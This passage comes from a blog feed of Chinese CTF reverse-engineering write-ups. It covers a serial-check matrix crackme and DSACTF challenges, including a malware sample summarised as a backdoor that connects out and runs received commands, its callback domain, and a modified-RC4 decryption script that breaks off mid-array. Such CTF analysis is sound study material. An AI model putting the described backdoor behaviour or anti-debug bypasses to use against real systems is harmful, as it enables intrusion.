punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">31</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token function\">sub_565C60DA</span><span class=\"token punctuation\">(</span>v20<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;=</span> <span class=\"token number\">31</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_565DF8D6</span><span class=\"token punctuation\">(</span>v21<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// v3=v21[j]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>          v17 <span class=\"token operator\">=</span> <span class=\"token function\">sub_565DF8FA</span><span class=\"token punctuation\">(</span>v20<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>v3<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// v17=v20[j]^v21[j]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>          <span class=\"token operator\">*</span><span class=\"token function\">sub_565DF8D6</span><span class=\"token punctuation\">(</span>v21<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v17<span class=\"token punctuation\">;</span>          <span class=\"token comment\">// v21[j]=v17</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span>                                       <span class=\"token comment\">// 不同的轮 v20 还是一样 v21 不一样了</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token function\">sub_565DF8D6</span><span class=\"token punctuation\">(</span>v21<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 33 位变 0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        v4 <span class=\"token operator\">=</span> <span class=\"token function\">sub_565DF92A</span><span class=\"token punctuation\">(</span>v21<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                 <span class=\"token comment\">// 指针</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> v4<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> input<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>            <span class=\"token comment\">// 逐位验证</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          v5 <span class=\"token operator\">=</span> m <span class=\"token operator\">/</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>          v6 <span class=\"token operator\">=</span> m<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>          v19<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v5 <span class=\"token operator\">+</span> v6 <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          v39 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>          <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>                                <span class=\"token comment\">// 最终 v19 的值是关键 后面用到</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v39 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token operator\">++</span>k<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上面 v21 数组有初值，v20 数组定值</p>\n<p>v21 运行会生成一个固定的表进行验证</p>\n<p>v4 是一个固定的表:</p>\n<p>23456789ABCDEFGHJKLMNPQRSTUVWXYZ</p>\n<p>修改构造密码为：33333-22222-33333-44444-55555 或者 33333-22222-AAAAA-BBBBB-CCCCC</p>\n<p>v19 里面存的是每个密码相对于对于表中的位置，2→0, 3→1, 4→2</p>\n<p>感觉思路是根据后面对 name 的运算 逆向推出 v19 的值，再推出密码</p>\n<p>直接在下断点</p>\n<p><img data-src=\"/images/121.png\" alt=\"121\"></p>\n<p>得 v18 再求其逆矩阵 求 v19 就行    v19 知道了再查表就知道密码了</p>\n<p><img data-src=\"/images/image2.png\" alt=\"image2\"></p>\n<p>分析结果就是这个官方 WP 中的图</p>\n<p>对于求逆矩阵 写了个 z3 脚本却怎么也没跑出</p>\n<p>看了 WP 才发现其实有一个反调试…</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/06/18/DSACTF%E9%80%86%E5%90%91%E4%B8%93%E9%A1%B9/",
            "url": "https://3cly.github.io/2023/06/18/DSACTF%E9%80%86%E5%90%91%E4%B8%93%E9%A1%B9/",
            "title": "DSACTF逆向专项",
            "date_published": "2023-06-18T07:29:46.000Z",
            "content_html": "<h1 id=\"dsactf逆向专项\"><a class=\"markdownIt-Anchor\" href=\"#dsactf逆向专项\">#</a> DSACTF 逆向专项</h1>\n<h2 id=\"careful\"><a class=\"markdownIt-Anchor\" href=\"#careful\">#</a> careful</h2>\n<p>纯纯的签到</p>\n<p>题目给出了一个恶意样本，请分析出样本请求服务器的域名 (flag 的形式为 DASCTF {md5 (域名)}) 其中 md5 值都是小写</p>\n<p><img data-src=\"/images/image-20230604094259190.png\" alt=\"image-20230604094259190\"></p>\n<p>第一眼看感觉像是比较数据什么的</p>\n<p>直接 gpt 分析得出 (其实也不用分析，只是可以了解一下)</p>\n<p>这段代码是一个用于远程控制的程序，其主要功能是通过网络连接到指定目标主机并执行接收到的命令。</p>\n<ol>\n<li>WSAStartup (0x202u, &amp;WSAData) 初始化套接字库，如果失败则返回 0。</li>\n<li>socket (2, 1, 6) 创建一个套接字，使用 IPv4 和 TCP 协议，如果失败则输出错误信息并返回 0。</li>\n<li>设置连接目标主机的 IP 地址和端口号等参数。</li>\n<li>connect ((SOCKET) s, &amp;v12, 16) 建立与目标主机的连接，如果成功则输出连接成功的信息。</li>\n<li>然后进入一个无限循环，不断地接收从目标主机发送过来的命令，并执行这些命令。</li>\n<li>在循环内部，每次接收到消息之后，使用 CreateProcessA 函数创建一个新的进程，并在其中执行接收到的命令。</li>\n<li>使用 WaitForSingleObject 函数等待新进程执行完毕。</li>\n<li>如果 connect 函数返回失败，则输出连接错误的信息并返回 1。</li>\n</ol>\n<p>flag 直接下断点调试得 不说了 看图都懂了</p>\n<p><img data-src=\"/images/image-20230604131531558.png\" alt=\"image-20230604131531558\"></p>\n<p><img data-src=\"/images/image-20230604132908731.png\" alt=\"image-20230604132908731\"></p>\n<p><img data-src=\"/images/image-20230604132607210.png\" alt=\"image-20230604132607210\"></p>\n<p><img data-src=\"/images/image-20230604132526463.png\" alt=\"image-20230604132526463\"></p>\n<p>小学生都会的动调调试，</p>\n<p>域名：Just_An_APIH00k11.com</p>\n<p f18566f93963f72f463fdfa2d163c37c>DSACTF</p>\n<h2 id=\"babyre\"><a class=\"markdownIt-Anchor\" href=\"#babyre\">#</a> babyre</h2>\n<p>其实不难 只是我太久没做题了 (狡辩)</p>\n<p>shift+F12 发现成功字符跳到比较</p>\n<p><img data-src=\"/images/image-20230604142008084.png\" alt=\"image-20230604142008084\"></p>\n<p>前面是加密</p>\n<p><img data-src=\"/images/image-20230604141602766.png\" alt=\"image-20230604141602766\"></p>\n<p>2000 的异或数组</p>\n<p>然后<strong>交叉引用</strong>发现<img data-src=\"/images/image-20230604201729150.png\" alt=\"image-20230604201729150\"><strong>isdebuggerpresent</strong></p>\n<p>直接在数组里改回来就行 然后我选择 dump 出来这个加密部分</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230604214606.png\" alt=\"QQ图片20230604214606\"></p>\n<p>再放入 IDA</p>\n<p><img data-src=\"/images/image-20230604202155486.png\" alt=\"image-20230604202155486\"></p>\n<p>正确的函数</p>\n<p><img data-src=\"/images/image-20230604202220435.png\" alt=\"image-20230604202220435\"></p>\n<p><img data-src=\"/images/image-20230604205047698.png\" alt=\"image-20230604205047698\"></p>\n<p>魔改了 2 部分</p>\n<p><img data-src=\"/images/image-20230604205905954.png\" alt=\"image-20230604205905954\"></p>\n<p>紫砂了 眼睛都看花了 最后写的解密脚本如下</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">rc4</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> keylen<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> datalen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span>keylenl<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 初始化 S 盒</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t x <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>j<span class=\"token operator\">+</span> x  <span class=\"token operator\">+</span> key<span class=\"token punctuation\">[</span> keylenl<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">// 交换 S [i] 和 S [j]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">++</span>keylenl <span class=\"token operator\">>=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tkeylenl <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    i <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> n <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> datalen<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">// 交换 S [i] 和 S [j]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        x <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\tdata<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span>n<span class=\"token operator\">%</span><span class=\"token number\">13</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        data<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>j <span class=\"token operator\">+</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">93</span><span class=\"token punctuation\">,</span><span class=\"token number\">66</span><span class=\"token punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">41</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">71</span><span class=\"token punctuation\">,</span><span class=\"token number\">65</span><span class=\"token punctuation\">,</span><span class=\"token number\">21</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> keylen <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span> <span class=\"token comment\">// 减去末尾的 '\\0'</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">44</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tdata<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">46</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">52</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">114</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">49</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">94</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">69</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">79</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">43</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">112</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">120</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">120</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">19</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">70</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">56</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">37</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">38</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">108</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">67</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">44</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">119</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">14</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">49</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">86</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">120</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">58</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">49</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">46</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">73</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">33</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">90</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">63</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">35</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">66</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">36</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">80</span><span class=\"token 